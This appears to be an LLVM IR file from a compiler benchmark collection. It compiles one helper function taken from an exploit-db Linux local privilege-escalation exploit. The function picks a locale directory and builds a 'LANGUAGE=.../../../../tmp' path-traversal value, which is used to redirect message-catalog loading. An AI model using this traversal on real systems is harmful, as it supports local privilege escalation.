; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_209.c_search_valid_language.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_209.c_search_valid_language.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.dirent = type { i8* }

@.str = private unnamed_addr constant [18 x i8] c"/usr/share/locale\00", align 1
@.str.1 = private unnamed_addr constant [36 x i8] c"failed to opendir /usr/share/locale\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"aborting\0A\00", align 1
@language = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [24 x i8] c"malloc failed\0Aaborting\0A\00", align 1
@.str.4 = private unnamed_addr constant [34 x i8] c"LANGUAGE=%s/../../../../../../tmp\00", align 1
@.str.5 = private unnamed_addr constant [13 x i8] c" [using %s] \00", align 1
@.str.6 = private unnamed_addr constant [42 x i8] c"failed to find a valid language\0Aaborting\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @search_valid_language() #0 {
  %1 = alloca i32*, align 8
  %2 = alloca %struct.dirent*, align 8
  %3 = call i32* @opendir(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i64 0, i64 0))
  store i32* %3, i32** %1, align 8
  %4 = load i32*, i32** %1, align 8
  %5 = icmp ne i32* %4, null
  br i1 %5, label %10, label %6

6:                                                ; preds = %0
  %7 = call i32 @perror(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.1, i64 0, i64 0))
  %8 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  %9 = call i32 @exit(i32 0) #3
  unreachable

10:                                               ; preds = %0
  br label %11

11:                                               ; preds = %21, %10
  %12 = load i32*, i32** %1, align 8
  %13 = call %struct.dirent* @readdir(i32* %12)
  store %struct.dirent* %13, %struct.dirent** %2, align 8
  %14 = icmp ne %struct.dirent* %13, null
  br i1 %14, label %15, label %54

15:                                               ; preds = %11
  %16 = load %struct.dirent*, %struct.dirent** %2, align 8
  %17 = getelementptr inbounds %struct.dirent, %struct.dirent* %16, i32 0, i32 0
  %18 = load i8*, i8** %17, align 8
  %19 = call i32 @strchr(i8* %18, i8 signext 95)
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %22, label %21

21:                                               ; preds = %15
  br label %11

22:                                               ; preds = %15
  %23 = load %struct.dirent*, %struct.dirent** %2, align 8
  %24 = getelementptr inbounds %struct.dirent, %struct.dirent* %23, i32 0, i32 0
  %25 = load i8*, i8** %24, align 8
  %26 = call i64 @strlen(i8* %25)
  %27 = add nsw i64 40, %26
  %28 = call i64 @malloc(i64 %27)
  %29 = inttoptr i64 %28 to i8*
  store i8* %29, i8** @language, align 8
  %30 = load i8*, i8** @language, align 8
  %31 = icmp ne i8* %30, null
  br i1 %31, label %35, label %32

32:                                               ; preds = %22
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0))
  %34 = call i32 @exit(i32 0) #3
  unreachable

35:                                               ; preds = %22
  %36 = load i8*, i8** @language, align 8
  %37 = load %struct.dirent*, %struct.dirent** %2, align 8
  %38 = getelementptr inbounds %struct.dirent, %struct.dirent* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i64 @strlen(i8* %39)
  %41 = add nsw i64 40, %40
  %42 = call i32 @memset(i8* %36, i32 0, i64 %41)
  %43 = load i8*, i8** @language, align 8
  %44 = load %struct.dirent*, %struct.dirent** %2, align 8
  %45 = getelementptr inbounds %struct.dirent, %struct.dirent* %44, i32 0, i32 0
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @sprintf(i8* %43, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.4, i64 0, i64 0), i8* %46)
  %48 = load i32*, i32** %1, align 8
  %49 = call i32 @closedir(i32* %48)
  %50 = load %struct.dirent*, %struct.dirent** %2, align 8
  %51 = getelementptr inbounds %struct.dirent, %struct.dirent* %50, i32 0, i32 0
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0), i8* %52)
  ret void

54:                                               ; preds = %11
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.6, i64 0, i64 0))
  %56 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32* @opendir(i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local %struct.dirent* @readdir(i32*) #1

declare dso_local i32 @strchr(i8*, i8 signext) #1

declare dso_local i64 @malloc(i64) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @memset(i8*, i32, i64) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @closedir(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
